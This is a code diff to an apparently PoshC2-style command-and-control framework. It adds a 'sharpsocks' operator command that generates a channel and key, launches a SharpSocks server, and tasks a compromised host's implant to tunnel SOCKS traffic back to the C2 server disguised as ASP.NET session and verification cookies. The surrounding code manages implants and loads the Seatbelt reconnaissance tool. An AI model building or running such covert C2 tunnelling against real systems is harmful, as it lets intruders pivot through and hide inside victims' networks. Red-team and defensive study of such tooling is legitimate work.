@@ -2,12 +2,12 @@ import base64, re, traceback, os, readline
 from Alias import cs_alias, cs_replace
 from Colours import Colours
 from Utils import randomuri, validate_sleep_time
-from DB import new_task, update_sleep, update_label, unhide_implant, kill_implant, get_implantdetails, get_pid
+from DB import new_task, update_sleep, update_label, unhide_implant, kill_implant, get_implantdetails, get_pid, get_sharpurls, select_item
 from AutoLoads import check_module_loaded, run_autoloads_sharp
 from Help import sharp_help1
-from Config import ModulesDirectory, POSHDIR, ROOTDIR
+from Config import ModulesDirectory, POSHDIR, ROOTDIR, SocksHost
 from Core import readfile_with_completion, shellcodereadfile_with_completion
-from Utils import argp, load_file
+from Utils import argp, load_file, gen_key
 
 def handle_sharp_command(command, user, randomuri, startup):
     try:
@@ -102,6 +102,24 @@ def handle_sharp_command(command, user, randomuri, startup):
         if ri.lower() == "y":
           new_task("exit",user, randomuri)
           kill_implant(randomuri)
+
+    elif (command.lower() == "sharpsocks") or (command.lower() == "sharpsocks "):
+      import string
+      from random import choice
+      allchar = string.ascii_letters
+      channel = "".join(choice(allchar) for x in range(25))
+      sharpkey = gen_key()
+      sharpurls = get_sharpurls()
+      sharpurls = sharpurls.split(",")
+      sharpurl = select_item("HostnameIP", "C2Server")
+      print (POSHDIR+"SharpSocks/SharpSocksServerCore -c=%s -k=%s --verbose -l=%s\r\n" % (channel,sharpkey,SocksHost)+Colours.GREEN)
+      ri = raw_input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
+      if ri.lower() == "n":
+        print("")        
+      if ri == "":
+        new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -Client -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl,channel,sharpkey,sharpurls[0].replace("\"",""),sharpurls[1].replace("\"","")), user, randomuri)
+      if ri.lower() == "y":
+        new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -Client -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl,channel,sharpkey,sharpurls[0].replace("\"",""),sharpurls[1].replace("\"","")), user, randomuri)
     
     elif "seatbelt " in command.lower():
         check_module_loaded("Seatbelt.exe", randomuri, user)
